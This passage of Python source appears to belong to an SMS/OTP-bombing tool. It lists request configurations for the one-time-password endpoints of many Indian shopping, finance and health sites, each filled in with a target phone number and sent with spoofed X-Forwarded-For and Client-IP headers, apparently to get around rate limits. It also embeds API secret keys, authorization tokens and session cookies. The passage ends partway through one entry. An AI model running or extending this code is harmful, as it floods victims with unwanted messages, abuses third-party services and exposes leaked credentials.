            "payload": lambda phone: json.dumps({"phone": phone, "country_code": "+91"}),
            "headers": {
                "Deviceid": "5df83c463f0ff8ff",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
                "Accept-Language": "en-US",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://stratzy.in/api/web/auth/sendPhoneOTP",
            "method": "POST",
            "payload": lambda phone: json.dumps({"phoneNo": phone}),
            "headers": {
                "sec-ch-ua-platform": "\"Android\"",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "accept": "*/*",
                "origin": "https://stratzy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://stratzy.in/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "payload": lambda phone: json.dumps({"phoneNo": phone}),
            "headers": {
                "sec-ch-ua-platform": "\"Android\"",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "accept": "*/*",
                "origin": "https://stratzy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://stratzy.in/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "payload": lambda phone: json.dumps({"contact_no": phone}),
            "headers": {
                "sec-ch-ua-platform": "\"Android\"",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "content-type": "application/json; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://wellacademy.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://wellacademy.in/store/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "payload": lambda phone: json.dumps({"city": 362, "fullName": "", "phone": phone, "source": "myaccount", "location": "", "leadSourceLang": "", "platform": "", "consent": False, "whatsappConsent": False, "blockNotification": False, "utmSource": "", "utmCampaign": "", "sessionInfo": {"sessionInfo": {"sessionId": "d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b", "userId": "0", "sessionRawString": "pathname=/account/new-landing&source=myaccount", "referrerUrl": "/app_login?pathname=/account/new-landing&source=myaccount"}, "deviceInfo": {"deviceRawString": "cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore", "device_token": "PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA", "device_type": "Android"}}}),
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "\"Android\"",
                "changesorigin": "product-listingpage",
                "originid": "0",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "appname": "Website",
                "userid": "0",
                "origin": "https://www.beepkart.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.beepkart.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://lendingplate.com/api.php",
            "method": "POST",
            "payload": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3",
            "headers": {
                "Host": "lendingplate.com",
                "Connection": "keep-alive",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://lendingplate.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://lendingplate.com/personal-loan",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "payload": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "client-id": "snitch_secret",
                "Accept-Headers": "application/json",
                "Origin": "https://www.snitch.com",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.snitch.com/",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
            "method": "GET",
            "payload": None,
            "headers": {
                "Host": "www.jockey.in",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Accept": "*/*",
                "Referer": "https://www.jockey.in/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
            "method": "GET",
            "payload": None,
            "headers": {
                "Host": "www.jockey.in",
                "Accept": "*/*",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.jockey.in/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Cookie": "secure_customer_sig=; localization=IN; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D; _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4; wishlist_id=7531056362767gn1bc6na3; bookmarkeditems={\"items\":[]}; wishlist_customer_id=0; _orig_referrer=; _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%3D38a52d30f4363b9ee4e8ffea783532bb; keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234; cart_ts=1736192207; cart_sig=04c8cecd093ed714d4a4dd68dfcc4020; cart_currency=INR; _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed; _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "payload": lambda phone: json.dumps({"mobile_number": phone, "resend_otp_request": True}),
            "headers": {
                "Host": "prodapi.newme.asia",
                "Timestamp": lambda: str(int(time.time() * 1000)),
                "Delivery-Pincode": "",
                "Caller": "web_app",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://newme.asia",
                "Referer": "https://newme.asia/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
            "method": "GET",
            "payload": None,
            "headers": {
                "Host": "api.univest.in",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "payload": lambda phone: json.dumps({"country_code": "+91", "phone": phone}),
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "payload": lambda phone: json.dumps({"guest_token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "user": {"phone_number": f"+91{phone}"}, "device": None, "invite_code": ""}),
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Platform": "web",
                "Origin": "https://www.foxy.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.foxy.in/onboarding",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://auth.eka.care/auth/init",
            "method": "POST",
            "payload": lambda phone: json.dumps({"payload": {"allowWhatsapp": True, "mobile": f"+91{phone}"}, "type": "mobile"}),
            "headers": {
                "Device-Id": "5df83c463f0ff8ff",
                "Flavour": "android",
                "Locale": "en",
                "Version": "1382",
                "Client-Id": "androidp",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9.3",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "payload": lambda phone: json.dumps({"user": {"phone_number": f"+91{phone}"}, "via": "whatsapp"}),
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Platform": "web",
                "Origin": "https://www.foxy.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.foxy.in/onboarding",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "payload": lambda phone: json.dumps({"ad_id": "", "device_info": {}, "device_id": "", "app_version": "", "device_token": "", "device_platform": "web", "phone": phone, "email": "sdhabai09@gmail.com"}),
            "headers": {
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://smytten.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://smytten.com/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "Desktop-Request": "false",
                "Web-Version": "1",
                "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
                "Request-Type": "web",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "payload": lambda phone: json.dumps({"mobile": phone, "whatsapp_opt_in": 1}),
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.wakefit.co",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.wakefit.co/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "API-Secret-Key": "ycq55IbIjkLb",
                "API-Token": "c84d563b77441d784dce71323f69eb42",
                "My-Cookie": "undefined",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "payload": lambda phone: json.dumps({"query": f"\n        mutation {{\n            SendOtp( \n                input: {{\n        mobile: \"{phone}\",\n        isdCode: \"91\",\n        otpType: \"registerOtp\"\n      }}\n            ) {{\n                status {{\n                    message\n                    code\n                }}\n            }}\n        }}\n    "}),
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Origin": "https://www.caratlane.com",
                "Referer": "https://www.caratlane.com/register",
                "Accept-Encoding": "gzip, deflate, br",
                "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
                "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "payload": lambda phone: f"mobilenumber={phone}&otptype=register&resendotp=0&email=&oldmobile=0",
            "headers": {
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://www.cossouq.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Cookie": "X-Magento-Vary=7253ab9fc388bf858e88f6c5b3ad9d20efd0c2afa76c88022c82f5b7e12d8dd8; PHPSESSID=0bf7f5d8d3af44bc50aeda7b8b51fa8b; _gcl_au=1.1.1097443806.1745238499; _ga_3YTXH403VL=GS1.1.1745238499.1.0.1745238499.60.0.1102057604; _ga=GA1.1.192685670.1745238500; _fbp=fb.1.1745238506999.831971844971570496; fastrr_uuid=1b20f947-fed8-49e5-a719-e9ffad876e6d; fastrr_usid=1b20f947-fed8-49e5-a719-e9ffad876e6d-1745238507912; sociallogin_referer_store=https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1; form_key=YJhK7hwSLfPsrlIo; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; cf_clearance=j19CDG8K1gn1L1h7_4VZCKUooUZtTYpxeBUC2Lux3Zo-1745238510-1.2.1.1-Cqvbh_RiIRgsCZKrpq.nnB.sx3LbLUw3MdbYfWzupniUjlhOYxqxVZSfwZfdm39IFuJrct6OeXj60cIyZotm9G1qptUBqCEHw_A5XjlhmtZ5_52EG9n0r0q9rhTZ.qT6ao7jj8k4RANRvHshdV47fXpz7BmvvvHl856x.tnP32auJyOBAP0KAw9SyZSXAC3XhR2CWs._08I21k90gtw3Qv8tjjlbqQjQNV9_ctDV6j2J_kh4xzhzQQQ2LrbuxtHjF_AjllteBD7a4BwuGq9roN0N48thQC3_meeP8irRIXLN7ndRE4vnvQJgrVN9iE9DxDhphhKGRt4xiZthB9XpZvWgH1u62Q5otw9kyTp75bs; section_data_ids={%22merge-quote%22:1745238511%2C%22cart%22:1745238512%2C%22custom_section%22:1745238513}; private_content_version=1c35968280f95365b50e1c62ebfbdb01",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "payload": lambda phone: json.dumps({"phone": phone, "country": "in"}),
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "gk-version": "20250421065835697",
                "gk-timestamp": "58174641",
                "sec-ch-ua-platform": "Android",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "gk-signature": "076108",
                "gk-udf-1": "951",
                "sec-ch-ua-mobile": "?1",
                "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
                "gk-merchant-id": "19g6jlc658iad",
                "origin": "https://pdp.gokwik.co",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://pdp.gokwik.co/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
            "method": "POST",
            "payload": lambda phone: json.dumps({"loginUri": "https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login", "origin": "https://otpless.com", "deviceInfo": "{\"userAgent\":\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\",\"platform\":\"Linux armv81\",\"vendor\":\"Google Inc.\",\"browser\":\"Chrome\",\"connection\":\"4g\",\"language\":\"en-IN\",\"cookieEnabled\":true,\"screenWidth\":360,\"screenHeight\":800,\"screenColorDepth\":24,\"devicePixelRatio\":3,\"timezoneOffset\":-330,\"cpuArchitecture\":\"8-core\",\"fontFamily\":\"\\\"Times New Roman\\\"\",\"cHash\":\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\"}", "browser": "Chrome", "sdkPlatform": "SHOPIFY", "platform": "Android", "isLoginPage": True, "fingerprintJs": "{\"visitorId\":\"3bd3e9c36b55052f8c6aa470a1b7f1f7\",\"version\":\"4.6.1\",\"confidence\":{\"score\":0.4,\"comment\":\"0.994 if upgrade to Pro: https://fpjs.dev/pro\"}}", "channel": "OTP", "silentAuthEnabled": False, "triggerWebauthn": True, "mobile": phone, "value": "7029364131", "selectedCountryCode": "+91", "recaptchaToken": "YourRecaptchaTokenHere"}),
            "headers": {
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://otpless.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://otpless.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "payload": lambda phone: f"mobile={phone}",
            "headers": {
                "sec-ch-ua-platform": "Android",
                "viewport-width": "360",
                "ect": "4g",
                "device-memory": "8",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "dpr": "3",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.myimaginestore.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.myimaginestore.com/?srsltid=AfmBOorMjDyyPK614cwQ_BYW58QCQwqGy2z3CU1dNnWF-NnvMwFcpOgA",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
